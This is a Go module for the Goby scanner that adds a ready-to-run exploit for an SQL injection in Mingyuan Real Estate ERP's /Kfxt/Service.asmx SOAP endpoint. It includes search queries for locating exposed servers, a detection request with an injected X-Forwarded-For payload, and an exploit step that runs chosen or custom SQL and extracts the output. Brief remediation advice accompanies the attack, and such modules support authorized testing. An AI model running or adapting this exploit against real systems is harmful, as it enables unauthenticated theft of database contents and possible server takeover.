package exploits

import (
	"git.gobies.org/goby/goscanner/goutils"
)

func init() {
	expJson := `{
    "Name": "Mingyuan Real Estate ERP /Kfxt/Service.asmx SQL Injection Vulnerability",
    "Description": "<p>Mingyuan Real Estate ERP is an enterprise resource planning (ERP) system specifically designed for the real estate industry. This vulnerability exists in the WebService service, where attackers can inject malicious SQL statements into the X-Forwarded-For header to bypass IP permission checks, thereby obtaining sensitive information from the database (such as administrator passwords and user personal information), and potentially gaining system privileges through high-privilege operations.</p>",
    "Product": "Mingyuan-Yun-ERP",
    "Homepage": "http://www.myunke.com/",
    "DisclosureDate": "2025-01-08",
    "PostTime": "2025-01-09",
    "Author": "heqiming@baimaohui.net",
    "FofaQuery": "body=\"hibot.js\"||body=\".hibot\"||body=\"f96699bbadafca894f3c1b7a\"||body=\"明源云ERP\"||title=\"明源云ERP\"||title=\"明源地产ERP\"||(body=\"window.location.replace('/_base/Home/Error/browser.html?enablemip=0');\"&&body=\"深圳市明源云科技有限公司\")",
    "GobyQuery": "body=\"hibot.js\"||body=\".hibot\"||body=\"f96699bbadafca894f3c1b7a\"||body=\"明源云ERP\"||title=\"明源云ERP\"||title=\"明源地产ERP\"||(body=\"window.location.replace('/_base/Home/Error/browser.html?enablemip=0');\"&&body=\"深圳市明源云科技有限公司\")",
    "Level": "2",
    "Impact": "<p>This vulnerability allows unauthenticated attackers to obtain sensitive information or perform high-privilege operations through SQL injection, potentially leading to data leakage, privilege escalation, and complete server control.</p>",
    "Recommendation": "<p>It is recommended to fix the SQL injection vulnerability immediately by using parameterized queries or prepared statements to handle user input, avoiding direct SQL statement concatenation. Additionally, it is recommended to strictly validate input data and restrict database user permissions to prevent malicious operations.</p>",
    "References": [
        "https://axsec.blog.csdn.net/article/details/145017318?spm=1001.2014.3001.5502"
    ],
    "Is0day": false,
    "HasExp": true,
    "ExpParams": [
        {
            "name": "attackType",
            "type": "select",
            "value": "default,custom,sqlpoint",
            "show": ""
        },
        {
            "name": "default",
            "type": "select",
            "value": "SELECT DB_NAME(),SELECT @@VERSION,SELECT SYSTEM_USER",
            "show": "attackType=default"
        },
        {
            "name": "custom",
            "type": "input",
            "value": "SELECT DB_NAME()",
            "show": "attackType=custom"
        }
    ],
    "ExpTips": {
        "Type": "",
        "Content": ""
    },
    "ScanSteps": [
        "AND",
        {
            "Request": {
                "method": "POST",
                "uri": "/Kfxt/Service.asmx",
                "follow_redirect": true,
                "header": {
                    "Content-Type": "text/xml; charset=utf-8",
                    "SOAPAction": "http://www.mysoft.com.cn/queryProjects",
                    "X-Forwarded-For": "127.0.0.1') AND 6994 IN (SELECT (CHAR(78) + CHAR(52) + CHAR(100) + CHAR(57) + CHAR(70) + CHAR(50) + CHAR(119) + CHAR(88) + CHAR(49) + CHAR(90) + CHAR(55) + CHAR(107) + CHAR(56) + CHAR(76) + CHAR(109) + CHAR(51) + CHAR(66) + CHAR(48) + CHAR(113) + CHAR(80) + CHAR(54) + CHAR(99) + CHAR(74) + CHAR(53) + CHAR(86) + CHAR(52) + CHAR(116) + CHAR(82) + CHAR(57) + CHAR(100) + CHAR(72))) AND ('MEuY'='MEuY"
                },
                "data_type": "text",
                "data": "<?xml version=\"1.0\" encoding=\"utf-8\"?>\r\n<soap:Envelope xmlns:xsi=\"http://www.w3.org/2001/XMLSchema-instance\" xmlns:xsd=\"http://www.w3.org/2001/XMLSchema\" xmlns:soap=\"http://schemas.xmlsoap.org/soap/envelope/\">\r\n  <soap:Body>\r\n    <queryProjects xmlns=\"http://www.mysoft.com.cn/\">\r\n      <inpXML>&lt;xml&gt;&lt;buname&gt;abc&lt;/buname&gt;&lt;/xml&gt;</inpXML>\r\n    </queryProjects>\r\n  </soap:Body>\r\n</soap:Envelope>"
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "N4d9F2wX1Z7k8Lm3B0qP6cJ5V4tR9dH",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "ExploitSteps": [
        "AND",
        {
            "Request": {
                "method": "POST",
                "uri": "/Kfxt/Service.asmx",
                "follow_redirect": true,
                "header": {
                    "Content-Type": "text/xml; charset=utf-8",
                    "SOAPAction": "http://www.mysoft.com.cn/queryProjects",
                    "X-Forwarded-For": "X-Forwarded-For: 127.0.0.1') AND 6994 IN (SELECT (CHAR(126)+CHAR(126)+CHAR(126)+({{{payload}}})+CHAR(126)+CHAR(126)+CHAR(126))) AND ('MEuY'='MEuY"
                },
                "data_type": "text",
                "data": "<?xml version=\"1.0\" encoding=\"utf-8\"?>\r\n<soap:Envelope xmlns:xsi=\"http://www.w3.org/2001/XMLSchema-instance\" xmlns:xsd=\"http://www.w3.org/2001/XMLSchema\" xmlns:soap=\"http://schemas.xmlsoap.org/soap/envelope/\">\r\n  <soap:Body>\r\n    <queryProjects xmlns=\"http://www.mysoft.com.cn/\">\r\n      <inpXML>&lt;xml&gt;&lt;buname&gt;abc&lt;/buname&gt;&lt;/xml&gt;</inpXML>\r\n    </queryProjects>\r\n  </soap:Body>\r\n</soap:Envelope>"
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": [
                "output|lastbody|regex|~~~([^'][\\s\\S]*?)~~~",
                "output|when|attackType=sqlpoint|{{{lastreq}}}<?xml version=\"1.0\" encoding=\"utf-8\"?> <soap:Envelope xmlns:xsi=\"http://www.w3.org/2001/XMLSchema-instance\" xmlns:xsd=\"http://www.w3.org/2001/XMLSchema\" xmlns:soap=\"http://schemas.xmlsoap.org/soap/envelope/\">   <soap:Body>     <queryProjects xmlns=\"http://www.mysoft.com.cn/\">       <inpXML>&lt;xml&gt;&lt;buname&gt;abc&lt;/buname&gt;&lt;/xml&gt;</inpXML>     </queryProjects>   </soap:Body> </soap:Envelope>"
            ]
        }
    ],
    "Tags": [
        "SQL Injection",
        "2H1W"
    ],
    "VulType": [
        "SQL Injection"
    ],
    "CVEIDs": [
        ""
    ],
    "CNNVD": [
        ""
    ],
    "CNVD": [
        ""
    ],
    "CVSSScore": "8.5",
    "Translation": {
        "CN": {
            "Name": "明源地产ERP系统 /Kfxt/Service.asmx SQL 注入漏洞",
            "Product": "明源云-ERP",
            "Description": "<p>明源地产ERP是一款专为房地产行业设计的企业资源规划（ERP）系统，旨在帮助房地产企业实现全面的信息化管理，提高运营效率和管理水平。该漏洞存在于WebService服务中，攻击者可以通过在X-Forwarded-For头中注入恶意SQL语句，绕过IP权限校验，进而获取数据库中的敏感信息（如管理员密码、用户个人信息），甚至可能通过高权限操作获取服务器系统权限。</p>",
            "Recommendation": "<p>建议立即修复 SQL 注入漏洞，采用参数化查询或预编译语句来处理用户输入，避免直接拼接 SQL 语句。同时，建议对输入数据进行严格的合法性校验，并限制数据库用户的权限，防止恶意操作。</p>",
            "Impact": "<p>该漏洞允许未经身份验证的攻击者通过SQL注入获取敏感信息或执行高权限操作，可能导致数据泄露、权限提升以及服务器被完全控制等严重后果。</p>",
            "VulType": [
                "SQL注入"
            ],
            "Tags": [
                "SQL注入",
                "两高一弱"
            ]
        },
        "EN": {
            "Name": "Mingyuan Real Estate ERP /Kfxt/Service.asmx SQL Injection Vulnerability",
            "Product": "Mingyuan-Yun-ERP",
            "Description": "<p>Mingyuan Real Estate ERP is an enterprise resource planning (ERP) system specifically designed for the real estate industry. This vulnerability exists in the WebService service, where attackers can inject malicious SQL statements into the X-Forwarded-For header to bypass IP permission checks, thereby obtaining sensitive information from the database (such as administrator passwords and user personal information), and potentially gaining system privileges through high-privilege operations.</p>",
            "Recommendation": "<p>It is recommended to fix the SQL injection vulnerability immediately by using parameterized queries or prepared statements to handle user input, avoiding direct SQL statement concatenation. Additionally, it is recommended to strictly validate input data and restrict database user permissions to prevent malicious operations.</p>",
            "Impact": "<p>This vulnerability allows unauthenticated attackers to obtain sensitive information or perform high-privilege operations through SQL injection, potentially leading to data leakage, privilege escalation, and complete server control.</p>",
            "VulType": [
                "SQL Injection"
            ],
            "Tags": [
                "SQL Injection",
                "2H1W"
            ]
        }
    },
    "AttackSurfaces": {
        "Application": null,
        "Support": null,
        "Service": null,
        "System": null,
        "Hardware": null
    },
    "Variables": {
        "payload": "switch|attackType|{{{default}}}"
    },
    "VariablesOrder": [
        "payload"
    ],
    "EditType": "fast",
    "PocId": "9982"
}`
  
	ExpManager.AddExploit(NewExploit(
		goutils.GetFileName(),
		expJson,
		nil,
		nil,
	))
}